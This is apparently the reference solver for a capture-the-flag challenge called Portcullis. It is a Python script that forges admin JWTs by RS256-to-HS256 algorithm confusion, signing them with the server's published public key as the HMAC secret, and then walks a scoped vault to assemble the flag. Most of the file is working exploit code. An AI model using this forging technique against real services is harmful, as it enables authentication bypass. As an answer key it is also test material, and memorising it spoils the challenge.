#!/usr/bin/env python3
"""
ZSCTF :: Portcullis -- reference solver.

Intended path (JWT algorithm-confusion / key-confusion; exploits only the flaw
that is in plain sight in challenge/app.py's `jwt_verify`):

  1. Portcullis signs session tokens with RS256 and publishes its RSA PUBLIC key
     (needed to verify asymmetric tokens) at /pubkey.pem. That is normal.

  2. The verifier lets the TOKEN'S OWN HEADER pick the algorithm, and hands the
     same key object -- the public-key PEM bytes -- to whichever branch the header
     names:
         alg=RS256 -> verify an RSA signature with the public key      (correct)
         alg=HS256 -> verify an HMAC whose *secret* is the public key   (the bug)
     An HMAC secret must be secret; the public key is not. So we can mint tokens.

  3. Forge a token:  header {"alg":"HS256","typ":"JWT"},  payload {... "role":"admin"},
     signature = HMAC-SHA256( base64url(header)+"."+base64url(payload),
                              key = the exact bytes served at /pubkey.pem ).

  4. Present it to /admin (Authorization: Bearer ...). The flawed verifier HMACs
     with the public key, the MAC matches, role=admin -> we are inside the keep.

Reaching /admin no longer yields the flag -- only the MEANS. The flag's body is
split into N ordered fragments held by a capability-scoped credential vault
(/admin/vault). Step-up/OAuth style: /admin discloses the entry grant for scope 0;
each AUTHENTIC read of scope i returns fragment i and discloses `next_grant` for
scope i+1; so the scopes must be walked IN ORDER (the next grant cannot be computed
ahead). A wrong/absent grant returns a DECOY fragment that carries a '-', a
character the flag format forbids -- so a careless "sweep every scope" assembles a
flag-shaped NEAR-token that fails ^zerosecurectf\{[a-z0-9_]{8,48}\}$ and is
rejectable by reasoning. This solver walks the chain correctly and assembles the
flag from the authentic fragments, rejecting any decoy by that same discriminator.

Why no other cheap path: RS256 forgery needs the private key (2048-bit RSA, not
published); alg:none and every non-RS256/HS256 algorithm are rejected; there is
no weak symmetric secret to guess -- the ONLY working HS256 key is the public key;
and the vault never emits the whole flag in one response, nor the next grant on a
wrong one, so the scope chain cannot be short-circuited.

Usage:
    python solve.py --url http://HOST:PORT
"""
import re
import sys
import json
import time
import hmac
import base64
import hashlib
import argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError, URLError

# Published flag format. The decoy fragments inject a '-', which is outside this
# alphabet, so any assembly containing a decoy fails this rule by inspection.
FLAG_FORMAT = re.compile(r"^zerosecurectf\{[a-z0-9_]{8,48}\}$")


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def _get(url, timeout=20):
    req = Request(url, headers={"Accept": "*/*"})
    try:
        with urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except HTTPError as e:
        return e.code, e.read()


def _get_bearer(url, token, timeout=20):
    req = Request(url, headers={"Authorization": "Bearer " + token})
    try:
        with urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def forge_admin_token(pubkey_pem_bytes: bytes, issuer: str, extra: dict = None) -> str:
    """Mint an admin token whose HMAC-SHA256 key is the public-key PEM bytes.

    `extra` lets the caller attach the scope-chain claims (`scope`, `grant`) that
    the credential vault requires -- a freshly-formed scoped token per step.
    """
    now = int(time.time())
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"iss": issuer, "sub": "portcullis-admin", "role": "admin",
               "iat": now, "exp": now + 365 * 24 * 3600}
    if extra:
        payload.update(extra)
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = (h + "." + p).encode("ascii")
    sig = hmac.new(pubkey_pem_bytes, signing_input, hashlib.sha256).digest()
    return h + "." + p + "." + b64url(sig)


def solve(base: str) -> str:
    base = base.rstrip("/")

    # (optional, for robustness) learn the issuer the service stamps on its tokens.
    issuer = "portcullis-sso"
    st, info_raw = _get(base + "/info")
    if st == 200:
        try:
            issuer = json.loads(info_raw).get("issuer", issuer)
        except Exception:
            pass

    # 1) fetch the published verification key -- the EXACT bytes become our HMAC key.
    st, pem = _get(base + "/pubkey.pem")
    if st != 200 or b"BEGIN PUBLIC KEY" not in pem:
        raise SystemExit("[-] could not fetch public key PEM from /pubkey.pem (status %s)" % st)
    print("[+] fetched RS256 public key (%d bytes of PEM) -> using it as the HMAC secret" % len(pem))

    # 2) forge an admin token via algorithm confusion and open the keep.
    token = forge_admin_token(pem, issuer)
    print("[+] forged HS256 admin token: %s..." % token[:48])
    st, body = _get_bearer(base + "/admin", token)
    print("[+] GET /admin -> HTTP %s" % st)
    if st != 200:
        raise SystemExit("[-] admin console rejected the forged token:\n" + body[:400])

    # 3) /admin hands over only the MEANS: the vault endpoint, the number of
    #    scopes, the frame, and the entry grant for scope 0.
    try:
        fd = json.loads(body)["flag_delivery"]
        endpoint = fd["endpoint"]
        n_scopes = int(fd["scopes"])
        prefix = fd["assembly"]["prefix"]
        suffix = fd["assembly"]["suffix"]
        grant = fd["entry_grant"]
    except Exception as e:
        raise SystemExit("[-] /admin did not return the expected flag-delivery means: %s\n%s"
                         % (e, body[:400]))
    print("[+] reached the keep -> credential vault %s with %d ordered scopes" % (endpoint, n_scopes))

    # 4) walk the scope chain IN ORDER. Each authentic read returns one fragment
    #    and discloses the next scope's grant. A decoy fragment carries a '-'
    #    (invalid in the flag) and no next_grant -- reject it by that discriminator.
    fragments = []
    for scope in range(n_scopes):
        scoped = forge_admin_token(pem, issuer, {"scope": scope, "grant": grant})
        st, raw = _get_bearer(base + endpoint, scoped)
        if st != 200:
            raise SystemExit("[-] vault rejected scope %d (HTTP %s):\n%s" % (scope, st, raw[:400]))
        data = json.loads(raw)
        frag = data.get("fragment", "")
        if "-" in frag:
            raise SystemExit("[-] scope %d returned a DECOY fragment (%r contains '-', which the "
                             "flag format forbids): the grant was wrong." % (scope, frag))
        nxt = data.get("next_grant")
        if scope + 1 < n_scopes and not nxt:
            raise SystemExit("[-] scope %d returned no next_grant -> the chain is broken "
                             "(grant was not authentic)." % scope)
        print("[+] scope %d/%d authentic -> fragment %r" % (scope, n_scopes - 1, frag))
        fragments.append(frag)
        grant = nxt

    # 5) assemble and sanity-check against the published format rule.
    flag = prefix + "".join(fragments) + suffix
    if "-" in flag:
        raise SystemExit("[-] assembled a near-token containing '-': a decoy slipped in: %r" % flag)
    if not flag.startswith("zerosecurectf{") or not flag.endswith("}"):
        raise SystemExit("[-] assembled string is not flag-shaped: %r" % flag)
    if not FLAG_FORMAT.match(flag):
        # Not fatal: a per-instance flag body may legitimately exceed the {8,48}
        # bound. The decisive decoy discriminator ('-') has already been enforced.
        print("[!] note: %r is outside the published {8,48} body length bound "
              "(still the assembled authentic flag)." % flag)
    return flag


def main():
    ap = argparse.ArgumentParser(description="Portcullis reference solver (JWT algorithm confusion).")
    ap.add_argument("--url", required=True, metavar="http://HOST:PORT",
                    help="base URL of the running Portcullis app")
    args = ap.parse_args()
    try:
        flag = solve(args.url)
    except (URLError, OSError) as e:
        print("[-] network error talking to %s: %s" % (args.url, e))
        return 1
    print("[+] FLAG =", flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
